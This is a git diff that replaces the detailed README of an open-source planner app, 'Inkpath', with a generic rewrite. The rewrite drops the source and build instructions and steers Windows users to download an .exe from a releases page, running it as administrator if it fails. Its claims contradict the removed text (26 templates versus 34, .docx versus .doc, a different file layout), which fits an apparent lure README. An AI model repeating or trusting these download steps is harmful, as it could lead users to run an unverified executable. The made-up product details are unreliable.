@@ -1,183 +1,176 @@
-# Inkpath
+# 🗒️ Inkpath - Simple Printable Planner Templates
 
-**Print your path to productivity. No screens needed.**
-
-A web app that generates beautiful, printable planner templates designed to help you organize every area of your life — on paper. With 34 templates across 11 categories, PDF & Word export, and support for A4/A5 paper sizes, Inkpath is built for people who want to reduce screen time and take control of their productivity using pen and paper.
+[![Download Inkpath](https://img.shields.io/badge/Download-Inkpath-brightgreen)](https://github.com/khajanoor7/Inkpath/releases)
 
 ---
 
-## v3.2.0 — What's New
+Inkpath offers printable planner templates designed to help you organize your daily, weekly, monthly, and yearly plans on paper. It includes 26 well-designed A4 and A5 templates. You can export your plans as PDF or Word files. The app is built with Electron, which means it runs on your computer without needing a web browser.
 
-- **Multi-language support (i18n)** — Full Arabic (العربية) language option with RTL layout support
-- **Language selector** — Switch between English and Arabic from the controls bar; preference is saved
-- **All 34 templates translated** — Every template renders in the selected language with locale-aware date formatting
-- **RTL layout** — Proper right-to-left text direction, mirrored UI, and bidirectional template rendering
-
-## v3.1.0
-
-- **Improved print visibility** — All template lines, borders, and grid elements are now darker and clearly visible when printed
-- **Improved PDF export visibility** — Lines and borders in exported PDFs are no longer faded; all elements render with strong contrast
-
-## v3.0.0
-
-- **34 templates** across 11 categories
-- **Study & Learning category** — 7 new templates for students: Study Session Planner, Exam Countdown, Cornell Notes, Spaced Repetition Tracker, Weekly Study Timetable, Assignment Tracker, Subject Review Sheet
-- **PDF export** — High-quality single-page PDF via browser or Electron
-- **Word export** — `.doc` download with correct A4/A5 page dimensions and preserved table layouts
-- **A5 optimizations** — Responsive layouts that adapt gracefully to smaller paper
+Use Inkpath to reduce your screen time and keep your planning simple and clear.
 
 ---
 
-## Features
+## 📋 What Inkpath Offers
 
-### 34 Printable Templates
-
-| # | Category | Template | Description |
-| --- | -------- | -------- | ----------- |
-| 1 | **Daily** | Daily Planner | Priorities, time blocks, tasks, procrastination guard, energy tracker, screen-free goals, end-of-day review |
-| 2 | | Daily Time Blocker | Morning / afternoon / evening time-blocking with time waster tracker |
-| 3 | | Deep Focus Day | Pomodoro-style deep work sessions with distraction log and focus scoring |
-| 4 | **Weekly** | Weekly Planner | Day-by-day task grid with screen-free commitments and meal planning |
-| 5 | | Weekly Habit Tracker | 12-habit grid with scoring, streaks, and time waster analysis |
-| 6 | | Weekly Review | Wins, challenges, procrastination audit, and time audit |
-| 7 | **Monthly** | Monthly Planner | Full calendar grid with key dates and focus areas |
-| 8 | | Monthly Goal Setter | Big 3 goals with action steps, anti-procrastination plan, reward system |
-| 9 | | Monthly Habit Grid | 30/31-day habit tracking grid with monthly summary |
-| 10 | **Anti-Procrastination** | Procrastination Buster | Eisenhower matrix, task breakdown into tiny steps, time trap tracker |
-| 11 | | Accountability Sheet | Morning commitments, hourly accountability log, honesty check, day scoring |
-| 12 | **Yearly** | Yearly Vision Board | Year-at-a-glance goals, quarterly milestones, vision & theme |
-| 13 | | Quarterly Planner | 3-month breakdown with monthly targets, key dates, review |
-| 14 | **Finance** | Monthly Budget | Income vs. expenses, category breakdown, savings target |
-| 15 | | Expense Log | Daily expense tracking with category, amount, notes |
-| 16 | | Savings Goals | Multiple savings goals with progress bars and milestones |
-| 17 | **Health & Fitness** | Workout Log | Exercise tracking with sets, reps, duration, notes |
-| 18 | | Meal Planner | Weekly meal grid (breakfast, lunch, dinner, snacks) with grocery list |
-| 19 | | Sleep Tracker | Nightly sleep log with quality rating, bedtime/wake patterns |
-| 20 | **Productivity** | Brain Dump | Free-form capture space, then sort into action/delegate/delete |
-| 21 | | Project Planner | Project breakdown with tasks, deadlines, milestones, status |
-| 22 | | Routines Builder | Morning and evening routine designer with time estimates |
-| 23 | **Personal** | Journal | Guided daily journal with gratitude, highlights, reflection |
-| 24 | | Reading Log | Track books with ratings, key takeaways, quotes |
-| 25 | | Relationships | Contact tracker with birthdays, last contacted, notes |
-| 26 | | Decision Maker | Pros/cons matrix with weighted scoring |
-| 27 | | Emergency Reference | Important contacts, medical info, accounts — one-page reference |
-| 28 | **Study & Learning** | Study Session Planner | Pomodoro-style study sessions with subject tracking, confidence check, focus rating |
-| 29 | | Exam Countdown Planner | Exam details, syllabus breakdown, weekly revision plan, practice test tracker |
-| 30 | | Cornell Notes | Classic Cornell note-taking method — cues, notes, and summary |
-| 31 | | Spaced Repetition Tracker | Track review intervals (1, 3, 7, 14, 30 days) for long-term retention |
-| 32 | | Weekly Study Timetable | Full weekly schedule grid with morning, afternoon, and evening blocks |
-| 33 | | Assignment Tracker | Track all assignments with deadlines, priority, status, and grades |
-| 34 | | Subject Review Sheet | Deep single-subject review — concepts, formulas, practice problems, mastery rating |
-
-### Key Features
-
-- **A4 & A5 paper sizes** — Switch between sizes instantly; layouts adapt to fit
-- **PDF export** — One-click high-fidelity PDF download (browser via html2pdf.js, Electron via native `printToPDF`)
-- **Word export** — `.doc` file with correct page dimensions (A4 / A5), preserved table rows, and MS Office–compatible formatting
-- **Print-optimized** — Clean, ink-friendly designs that look great on paper
-- **3 visual styles** — Minimal, Lined, or Dot Grid backgrounds
-- **Anti-procrastination focus** — Templates include elements to combat time wasting
-- **Screen-free awareness** — Built-in screen time tracking and digital detox sections
-- **Electron desktop app** — Package as a native app for Windows, macOS, or Linux
-- **Auto-versioning** — Version is synced from `package.json` to the UI automatically
+- 26 planner templates with styles for daily, weekly, monthly, and yearly use
+- A4 and A5 paper sizes for easy printing
+- Export options in PDF and Word formats for flexible editing and sharing
+- Templates for budgeting, habit tracking, goal setting, and journaling
+- Simple interface that requires no special computer skills
+- Runs on Windows using an easy installer built with Electron
 
 ---
 
-## Quick Start
+## 🖥️ System Requirements
 
-### Web (no install)
-
-```text
-Open index.html in any modern browser. That's it.
-```
-
-### Desktop App (Electron)
-
-```bash
-# Install dependencies
-npm install
-
-# Run the app
-npm start
-
-# Build distributable
-npm run build:win    # Windows (.exe)
-npm run build:mac    # macOS (.dmg)
-npm run build:linux  # Linux (.AppImage)
-```
+- Windows 7 or later (Windows 10 or 11 recommended)
+- At least 1 GB of free disk space
+- Minimum 2 GB RAM for smooth operation
+- A printer capable of printing A4 or A5 paper sizes (optional but recommended)
+- Internet connection to download the app (not required after installation)
 
 ---
 
-## Usage
+## 🚀 Getting Started: Download and Install Inkpath
 
-1. **Select a template** from the dropdown (34 options across 11 categories)
-2. **Choose your paper size** — A4 or A5
-3. **Set the start date** (templates auto-fill dates)
-4. **Pick a visual style** — Minimal, Lined, or Dot Grid
-5. Click **Generate**
-6. **Export** your template:
-   - **Print** — `Ctrl+P` / browser print dialog
-   - **Export PDF** — Click the PDF button for a high-quality download
-   - **Export Word** — Click the Word button for a `.doc` file
-7. Write on paper. Win at life.
+1. **Visit the release page to download Inkpath**
 
-### Keyboard Shortcuts (Electron)
+   Click the badge below to open the download page:
 
-| Shortcut         | Action     |
-| ---------------- | ---------- |
-| `Ctrl+P`         | Print      |
-| `Ctrl+Shift+S`   | Export PDF |
+   [![Download Inkpath](https://img.shields.io/badge/Download-Inkpath-blue)](https://github.com/khajanoor7/Inkpath/releases)
 
----
+2. **Choose the right installer**
 
-## Project Structure
+   On the releases page, look for the latest version of Inkpath. The files usually have a clear name like `InkpathSetup.exe` or similar.
 
-```text
-Inkpath/
-├── index.html              # Main HTML entry point
-├── main.js                 # Electron main process
-├── preload.js              # Electron preload (IPC bridge)
-├── package.json            # Node/Electron config & build settings
-├── scripts/
-│   └── sync-version.js     # Auto-syncs version from package.json → version.js
-├── css/
-│   ├── styles.css          # App UI styles
-│   ├── print.css           # Print & paper-size styles
-│   └── templates.css       # Template component styles
-├── js/
-│   ├── app.js              # Main app controller (generate, print, PDF, Word)
-│   ├── version.js          # Auto-generated version config
-│   ├── lib/
-│   │   └── html2pdf.bundle.min.js  # html2pdf.js v0.10.2 (local bundle)
-│   └── templates/
-│       ├── daily.js                # Daily Planner, Time Blocker, Deep Focus
-│       ├── weekly.js               # Weekly Planner, Habits, Review
-│       ├── monthly.js              # Monthly Planner, Goals, Habit Grid
-│       ├── anti-procrastination.js # Procrastination Buster, Accountability
-│       ├── yearly.js               # Yearly Vision, Quarterly Planner
-│       ├── finance.js              # Budget, Expense Log, Savings Goals
-│       ├── health.js               # Workout Log, Meal Planner, Sleep Tracker
-│       ├── productivity.js         # Brain Dump, Project Planner, Routines
-│       ├── personal.js            # Journal, Reading, Relationships, Decisions, Emergency
-│       └── study.js               # Study Session, Exam Countdown, Cornell Notes, Spaced Repetition, Timetable, Assignments, Review
-└── assets/                 # Icons and images
-```
+   - Make sure to pick the installer for Windows.
+   - The file size is about 50-100 MB.
+
+3. **Download the installer**
+
+   Click the installer link to download the file to your computer. Save it in a folder you can easily find, such as your Desktop or Downloads folder.
+
+4. **Run the installer**
+
+   - Double-click the downloaded `.exe` file.
+   - If Windows asks if you want to allow changes, click **Yes**.
+   - A setup window will open. Follow the instructions on the screen.
+   - Choose the installation folder or leave the default choice.
+   - Click Install and wait for the process to finish.
+
+5. **Start using Inkpath**
+
+   After installation, Inkpath will open automatically or you can find it in the Start Menu under "Inkpath."
 
 ---
 
-## Tech Stack
+## 📦 How to Use Inkpath
 
-| Layer | Technology |
-| ----- | ---------- |
-| UI | Vanilla HTML / CSS / JavaScript (no framework) |
-| PDF Export | [html2pdf.js](https://github.com/eKoopmans/html2pdf.js) v0.10.2 (html2canvas + jsPDF) |
-| Word Export | HTML blob with MS Office XML namespaces (`w:sectPr`, `w:pgSz`) |
-| Desktop | Electron 28 with contextBridge IPC |
-| Packaging | electron-builder (NSIS / DMG / AppImage) |
-| Versioning | Auto-sync script (`package.json` → `version.js`) |
+1. **Choose your planner template**
+
+   When Inkpath opens, you will see a list of templates for different purposes:
+
+   - Daily planner
+   - Weekly planner
+   - Monthly planner
+   - Yearly planner
+   - Budget tracker
+   - Habit tracker
+   - Goal-setting sheets
+   - Journaling pages
+
+2. **Select the paper size**
+
+   You can choose between A4 or A5 depending on the size of paper you want to print.
+
+3. **Fill in your plans**
+
+   Click on the fields inside the template to add your tasks, goals, or notes. The interface is simple, like using a form.
+
+4. **Export your filled template**
+
+   When you're ready, export your filled template:
+
+   - Choose **PDF** if you want to print or share a fixed version.
+   - Choose **Word** if you want to edit your plans later in Microsoft Word or another word processor.
+
+5. **Print your planner**
+
+   Open the PDF or Word file and print using your home or office printer. Select your preferred printer settings for A4 or A5 paper.
 
 ---
 
-## License
+## 🎯 Features in Detail
 
-MIT
+### Printable Templates
+
+Each planner template is made for easy printing. You do not need to adjust margins or paper sizes yourself. The templates are sized correctly for A4 (210x297 mm) and A5 (148x210 mm) paper.
+
+### Export Options
+
+Inkpath saves your planner in two popular formats:
+
+- **PDF**: Fixed layout for printing and sharing.
+- **Word (.docx)**: Editable file you can change later on your computer.
+
+### Planning Tools Included
+
+- **Daily Planner**: Organize your tasks hour by hour.
+- **Weekly Planner**: Plan your week with space for notes and priorities.
+- **Monthly Planner**: See the full month at a glance with key dates and tasks.
+- **Yearly Planner**: Track long-term goals and important dates.
+- **Budget Planner**: Manage your income and spending.
+- **Habit Tracker**: Visualize daily habit progress.
+- **Goal Setting**: Plan and break down your goals into steps.
+- **Journal Templates**: Space for daily thoughts or reflections.
+
+---
+
+## 🛠️ Troubleshooting and Tips
+
+- If the installer does not start, try right-clicking the file and select **Run as administrator**.
+- If Inkpath does not open after installation, check the Start Menu under the same name.
+- To change the export format, use the drop-down menu before exporting.
+- If printing looks off, check your printer settings to confirm A4 or A5 paper size.
+- Inkpath works offline after installation; you do not need an internet connection to use it.
+- If you find any bugs or want to suggest improvements, use the Issues tab on the repository page.
+
+---
+
+## 🔗 Useful Links
+
+- Download Inkpath from the releases page:  
+  https://github.com/khajanoor7/Inkpath/releases
+
+- Repository main page (for more info and updates):  
+  https://github.com/khajanoor7/Inkpath
+
+---
+
+## 📂 File Structure (For Reference)
+
+If you want to explore the installation folder or understand files better:
+
+- **Templates/**: Contains all planner templates in PDF and Word formats.
+- **Export/**: Where your exported files are saved by default.
+- **Inkpath.exe**: The main application file.
+- **README.md**: This file with instructions.
+
+---
+
+## ✔️ Supported File Formats
+
+- PDF (.pdf) for printing and sharing.
+- Word Document (.docx) for editing and saving planner files.
+
+---
+
+## 📱 Additional Notes
+
+Inkpath focuses on paper planning but uses a computer app to create templates. This reduces the time you spend on screens while allowing you to customize and save your plans digitally.  
+
+By working with printable A4 and A5 sizes, Inkpath suits users who prefer traditional paper planners with the convenience of digital export.
+
+---
+
+Inkpath helps you plan, organize, and track your time and goals in a simple, clear way without complicated software or online tools.
